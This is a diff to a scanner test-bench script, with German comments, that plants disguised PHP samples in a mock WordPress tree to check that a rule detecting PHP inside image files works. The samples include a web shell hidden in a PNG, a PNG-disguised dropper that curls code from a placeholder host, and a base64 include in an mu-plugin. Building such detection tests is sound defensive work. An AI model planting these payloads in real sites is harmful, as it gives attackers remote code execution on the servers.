@@ -238,6 +238,31 @@ PHP
   # Als Nicht-PHP getarnte Nutzlast.
   printf '\x89PNG\r\n\x1a\n<?php system($_GET["x"]); ?>\n' \
     > "${k2}/wp-content/uploads/2026/03/logo.png"
+  # Zweite getarnte Nutzlast — bewusst OHNE jedes Verdachtsmerkmal.
+  #
+  # Die Probe darueber enthaelt system($_GET[…]) und schlaegt damit auch bei
+  # den Musterpruefungen an. Sie taugt deshalb nicht, um 7.13 zu pruefen: man
+  # koennte den Abschnitt entfernen, und der Pruefstand bliebe stumm.
+  #
+  # Diese hier hat kein eval, kein base64, keine Superglobale, keine Funktion
+  # aus einer Verdachtsliste. Auf Token-Ebene harmloser Code — genau wie der
+  # Dropper des Anlassfalls, den weder Signaturscanner noch Heuristik noch ein
+  # fremder YARA-Regelsatz meldeten. Erkennbar ist allein der Behaelter: ein
+  # Bild, in dem PHP steht. Faellt 7.13 weg, faellt dieser Fund weg.
+  #
+  # NT_PRUEFSTAND_OHNE_MEDIENPROBE=1 laesst diese Probe weg. Damit prueft die
+  # CI, ob 7.13 den Fund ueberhaupt traegt: ohne die Probe muss der Vergleich
+  # gegen die Referenz ausschlagen. Tut er das nicht, ist der Abschnitt blind
+  # und der Pruefstand behauptet eine Abdeckung, die es nicht gibt.
+  mkdir -p "${k2}/wp-content/plugins/beispiel-plugin/assets"
+  if [[ "${NT_PRUEFSTAND_OHNE_MEDIENPROBE:-0}" != "1" ]]; then
+    printf '\x89PNG\r\n\x1a\n<?php $u="https://beispiel.invalid/n.php";$c=curl_init();curl_setopt($c,CURLOPT_URL,$u);$d=curl_exec($c);curl_close($c);\n' \
+      > "${k2}/wp-content/plugins/beispiel-plugin/assets/banner.png"
+  else
+    # Gleiche Datei, gleicher Name, aber ein echtes Bild ohne PHP.
+    printf '\x89PNG\r\n\x1a\nIHDR-nur-Bilddaten-kein-PHP\n' \
+      > "${k2}/wp-content/plugins/beispiel-plugin/assets/banner.png"
+  fi
   # mu-Plugin: laeuft ohne Aktivierung.
   printf '<?php @include base64_decode("L3RtcC94");\n' \
     > "${k2}/wp-content/mu-plugins/cache.php"
